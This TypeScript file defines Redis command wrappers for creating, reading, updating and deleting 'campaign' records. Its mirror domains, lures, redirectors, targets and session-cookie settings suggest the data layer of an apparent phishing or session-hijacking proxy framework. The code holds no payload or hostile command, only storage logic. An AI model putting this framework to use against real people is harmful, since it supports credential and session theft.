import { CommandParser } from '@redis/client'
import {
  campaignIndexKey,
  campaignKey,
  campaignUniqueMirrorDomainKey,
  lureIndexKey,
  proxyIndexKey,
  redirectorIndexKey,
  targetIndexKey
} from '../../database.keys.js'

export interface RawCampaign {
  campaign_id: string
  mirror_domain: string
  session_count: number
  message_count: number
  created_at: number
  updated_at: number
}

export interface RawFullCampaign extends RawCampaign {
  description: string
  landing_upgrade_path: string
  landing_upgrade_param: string
  landing_redirector_param: string
  session_cookie_name: string
  session_expire: number
  new_session_expire: number
  message_expire: number
  proxy_count: number
  target_count: number
  redirector_count: number
  lure_count: number
}

export const campaignFunctions = {
  campaign: {
    create_campaign: {
      NUMBER_OF_KEYS: 3,

      parseCommand(
        parser: CommandParser,
        prefix: string,
        campaignId: string,
        mirrorDomain: string,
        description: string,
        landingUpgradePath: string,
        landingUpgradeParam: string,
        landingRedirectorParam: string,
        sessionCookieName: string,
        sessionExpire: number,
        newSessionExpire: number,
        messageExpire: number
      ) {
        parser.pushKey(campaignKey(prefix, campaignId))
        parser.pushKey(campaignUniqueMirrorDomainKey(prefix))
        parser.pushKey(campaignIndexKey(prefix))

        parser.push(campaignId)
        parser.push(mirrorDomain)
        parser.push(description)
        parser.push(landingUpgradePath)
        parser.push(landingUpgradeParam)
        parser.push(landingRedirectorParam)
        parser.push(sessionCookieName)
        parser.push(sessionExpire.toString())
        parser.push(newSessionExpire.toString())
        parser.push(messageExpire.toString())
        parser.push(Date.now().toString())
      },

      transformReply: undefined as unknown as () => unknown
    },

    read_campaign: {
      NUMBER_OF_KEYS: 1,

      parseCommand(parser: CommandParser, prefix: string, campaignId: string) {
        parser.pushKey(campaignKey(prefix, campaignId))
      },

      transformReply: undefined as unknown as () => unknown
    },

    read_full_campaign: {
      NUMBER_OF_KEYS: 5,

      parseCommand(parser: CommandParser, prefix: string, campaignId: string) {
        parser.pushKey(campaignKey(prefix, campaignId))
        parser.pushKey(proxyIndexKey(prefix, campaignId))
        parser.pushKey(targetIndexKey(prefix, campaignId))
        parser.pushKey(redirectorIndexKey(prefix, campaignId))
        parser.pushKey(lureIndexKey(prefix, campaignId))
      },

      transformReply: undefined as unknown as () => unknown
    },

    read_campaign_index: {
      NUMBER_OF_KEYS: 1,

      parseCommand(parser: CommandParser, prefix: string) {
        parser.pushKey(campaignIndexKey(prefix))
      },

      transformReply: undefined as unknown as () => unknown
    },

    update_campaign: {
      NUMBER_OF_KEYS: 1,

      parseCommand(
        parser: CommandParser,
        prefix: string,
        campaignId: string,
        description: string | null | undefined,
        sessionExpire: number | null | undefined,
        newSessionExpire: number | null | undefined,
        messageExpire: number | null | undefined
      ) {
        parser.pushKey(campaignKey(prefix, campaignId))

        if (description != null) {
          parser.push('description')
          parser.push(description)
        }

        if (sessionExpire != null) {
          parser.push('session_expire')
          parser.push(sessionExpire.toString())
        }

        if (newSessionExpire != null) {
          parser.push('new_session_expire')
          parser.push(newSessionExpire.toString())
        }

        if (messageExpire != null) {
          parser.push('message_expire')
          parser.push(messageExpire.toString())
        }

        parser.push('updated_at')
        parser.push(Date.now().toString())
      },

      transformReply: undefined as unknown as () => unknown
    },

    delete_campaign: {
      NUMBER_OF_KEYS: 7,

      parseCommand(parser: CommandParser, prefix: string, campaignId: string) {
        parser.pushKey(campaignKey(prefix, campaignId))
        parser.pushKey(campaignUniqueMirrorDomainKey(prefix))
        parser.pushKey(campaignIndexKey(prefix))
        parser.pushKey(proxyIndexKey(prefix, campaignId))
        parser.pushKey(targetIndexKey(prefix, campaignId))
        parser.pushKey(redirectorIndexKey(prefix, campaignId))
        parser.pushKey(lureIndexKey(prefix, campaignId))
      },

      transformReply: undefined as unknown as () => unknown
    }
  }
} as const
